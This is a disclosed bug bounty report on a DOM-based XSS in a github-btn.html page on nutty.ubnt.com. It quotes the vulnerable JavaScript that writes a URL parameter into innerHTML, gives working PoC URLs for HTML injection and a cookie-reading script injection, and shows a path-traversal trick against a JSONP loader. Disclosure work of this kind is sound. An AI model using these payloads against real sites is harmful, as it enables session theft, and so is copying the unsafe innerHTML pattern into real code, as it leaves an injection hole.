# [nutty.ubnt.com] DOM Based XSS nuttyapp github-btn.html

## Report Details
- **Report ID**: 200753
- **URL**: https://hackerone.com/reports/200753
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-01-24T12:14:22.147Z
- **Disclosed**: 2017-03-30T11:18:05.422Z

## Reporter
- **Username**: bobrov
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ui

## Vulnerability Information
Description
===

**Vulnerable parameter:** user
**Vulnerable script:** http://nutty.ubnt.com/github-btn.html
**Vulnerable code:**
```js
  var params = function () {
    var vars = [], hash;
    var hashes = window.location.href.slice(window.location.href.indexOf('?') + 1).split('&');
    for(var i = 0; i < hashes.length; i++) {
      hash = hashes[i].split('=');
      vars.push(hash[0]);
      vars[hash[0]] = hash[1];
    }
    return vars;
  }()
  var user = params.user,
      repo = params.repo,
      type = params.type,
 ...
  } else if (type == 'follow') {
    mainButton.className += ' github-me';
    text.innerHTML = 'Follow @' + user;
```

PoCs
===


**PoC #1** 
HTML Injection for Chrome, Internet Explorer
```
http://nutty.ubnt.com/github-btn.html?#&user=<h1><marquee>HTML<br>HTML<br>HTML<br>HTML<br>HTML<br>HTML<br>&type=follow
```

**PoC #2**
XSS for Internet Explorer (using X-UA-Compatible IE=9)
```
http://bb.blackfan.ru/xss?c=%3Cmeta%20http-equiv=%22X-UA-Compatible%22%20content=%22IE=9%22%3E%3Ciframe%20src=%27http://nutty.ubnt.com/github-btn.html?%23%26user=yrdy%3Cscript%3Ealert(document.domain);alert(document.cookie);//%26type=follow%27%3E%3C/iframe%3E
```

{F154666}


Another vulns
===

Also, this script has potential vulnerabilities using user controlled parameters in the path to the JS script.
But for the exploitation it requires additional vulnerability on api.github.com (for example, Open Redirect or user controlled output).

```js
  function jsonp(path) {
    var el = document.createElement('script');
    el.src = path + '?callback=callback';
    head.insertBefore(el, head.firstChild);
  }
...
  if (type == 'follow') {
    jsonp('https://api.github.com/users/' + user);
  } else {
    jsonp('https://api.github.com/repos/' + user + '/' + repo);
  }
```

**PoC**
```
http://nutty.ubnt.com/github-btn.html?#&user=../../another/endpoint&repo=../../another/endpoint&type=fork
```

**Result**
```
https://api.github.com/another/endpoint?callback=callback
```

## Attachments
- Screenshot_at_15-59-15.png
